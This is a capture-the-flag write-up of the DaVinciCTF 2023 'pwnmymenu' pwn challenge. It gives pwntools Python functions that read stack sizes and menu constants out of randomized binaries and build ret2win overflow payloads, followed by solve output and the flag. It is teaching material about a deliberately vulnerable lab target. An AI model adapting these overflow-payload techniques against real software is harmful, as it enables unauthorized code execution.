# DaVinciCTF 2023 — Pwn Write-up : pwnmymenu


From Saturday, March 11 to Sunday, March 12, 2023, the DaVinci CTF was organized by the students of the Pôle Léonard de Vinci. Our team finished 10th overall out of 289 teams.

![](./data/dvinci.png)

Let’s go for a writeup of pwnmymenu, a pretty easy challenge in Pwn category.

Thanks to Valekoz for creating this challenge and to all DaVinciCode for managing this CTF!

```
Do you like automation ? Well, you will have to automate some ret2win in order to get the flag :)

nc pwn.dvc.tf 8890 
```

Files: [pwnmymenu.tgz](./pwnmymenu.tgz)

## Analysis

We were given the entire sources of the challenge (wich is kinda weird), so understanding what to exploit is pretty easy:
- We need to pwn "lvl1" 5 times
- "lvl2" 5 times
- and "lvl3" 10 times

For each level, it's a simple ret2win with the size of the stack randomized in a range between [1; 511]. For the level 2 and 3, 2 other random variables are introduced.

When we connect to the netcat, we get the base64 of the current challenge compiled.

```
$ nc pwn.dvc.tf 8890
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAEBFAAAAAAABAAAAAAAAAACA4AAAAAAAAAAAAAEAAOAAN
AEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
<snip>
AAAAACAEAAAAAAAAHQAAABMAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAA
AAAAsDQAAAAAAABKAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAA
AAAAAAAAAAAAAPo2AAAAAAAAHwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
aaaa
Enter your payload:
---------------------
---------------------
[+]    You failed exploiting my program ...
```

(Note that the IO is broken, the author probably forgot to flush the stdout when printing, so it makes everything a bit more annoying)

## Level 1

Basic ret2win, the only difficulty is to retrieve the size of the stack from the compiled binary. After the CTF, I saw that i could have used ELF.disasm from pwntools to have an easier way to retrieve the size of the stack. Anyway here's how I did it:

```python
e = ELF(f"level1.{n}", checksec=False)

vuln_func = e.sym["vuln"]
size = e.read(vuln_func+11, 2).hex()
if size[2] == "4":
	OFFSET = int(size[:2], 16)+8
else:
	size = size[2:] + size[:2]  # flemme de unpack
	OFFSET = int(size, 16)+8
```
In short: we go to the `vuln` function and look at the `sub rsp, 0x??` instruction at the function prologue. 
I'm curious on how the CPU knows the size of the instruction in order to know how to get the hex size, my dirty fix was to check if the next byte is "0x48" wich is the first byte of the next instruction. If so, I take the next 2 other bytes (max value is 511 so I just need 4 bytes, not all of them)

So here's the function that needs to be called 5 times:
```python
def payload_level1(n):
	e = ELF(f"level1.{n}", checksec=False)

	vuln_func = e.sym["vuln"]
	win_func = e.sym["win"]
	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8

	payload = b''.join([
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload
```

## Level 2

Same as level 1, except now we have to find the `menu` value and the `submenu`, menu is in [1; 6] and submenu in [a, b, c, d, e]

This time, I find the instruction `cmp` for both of the values and extract the random value here. And for the stack, I just re-used the same code for the level 1.
```python3
main_func = e.sym["main"]
submenu_func = e.sym["submenu"]
menu = e.read(main_func+75, 2)[1]
submenu = e.read(submenu_func+55, 2)[1]
```
Nothing special, here's the function:

```python
def payload_level2(n):
	e = ELF(f"level2.{n}", checksec=False)

	main_func = e.sym["main"]
	win_func = e.sym["win"]
	submenu_func = e.sym["submenu"]
	vuln_func = e.sym["vuln"]

	menu = e.read(main_func+75, 2)[1]
	
	submenu = e.read(submenu_func+55, 2)[1]

	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8
	
	payload = b''.join([
		chr(menu).encode("utf-8"),
		b"\n",
		chr(submenu).encode("utf-8"),
		b"\n",
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload
```

## Level 3

For this level, `menu` and `submenu` are longs, but at the end it's the exact same code as for level 2, I just had to change the offsets.

Here's the function:
```python
def payload_level3(n):
	e = ELF(f"level3.{n}", checksec=False)

	main_func = e.sym["main"]
	win_func = e.sym["win"]
	submenu_func = e.sym["submenu"]
	vuln_func = e.sym["vuln"]

	menu = e.read(main_func+78, 8)
	
	submenu = e.read(submenu_func+55, 8)
	
	size = e.read(vuln_func+11, 2).hex()
	if size[2] == "4":
		OFFSET = int(size[:2], 16)+8
	else:
		size = size[2:] + size[:2]  # flemme de unpack
		OFFSET = int(size, 16)+8

	payload = b''.join([
		menu,
		submenu,
		b"A"*OFFSET,
		p64(win_func)
	])

	return payload
```


## Script solve

You can find my entire script [here](./solve.py). When putting everything together I had a lot of trouble with the IO, sometimes it flushes when i'm supposed to read the base64 of the binary I tried to manage it, but it was not really working. I just restarted the script until it didn't crashed instead of fixing it. (It also takes a lot of time because I had a hard time reading the base64 so I just did a `recvrepeat(2)`)

```
python3 solve.py
[+] Opening connection to pwn.dvc.tf on port 8890: Done
PWNING LVL 1
Reading file 0... Sending payload n°0
<snip>
Reading file 4... Sending payload n°4
PWING LVL 2
Reading file 0... Sending payload n°0
<snip>
Reading file 4... Sending payload n°4
PWNING LVL 3
Reading file 0... Sending payload n°0
<snip>
Reading file 9... Sending payload n°9
[*] Switching to interactive mode
Submenu:
Enter your payload:
---------------------
<snip
---------------------
[+]    Level 1 finished successfully !
---------------------
<snip>
---------------------
[+]    Level 2 finished successfully !
---------------------
---------------------
<snip>
---------------------
---------------------
[+]    Level 3 finished successfully !
[+]    Flag is: `dvCTF{w04h_y0u_d3f3473d_my_m3nu}`
[*] Got EOF while reading in interactive
```

Flag: `dvCTF{w04h_y0u_d3f3473d_my_m3nu}`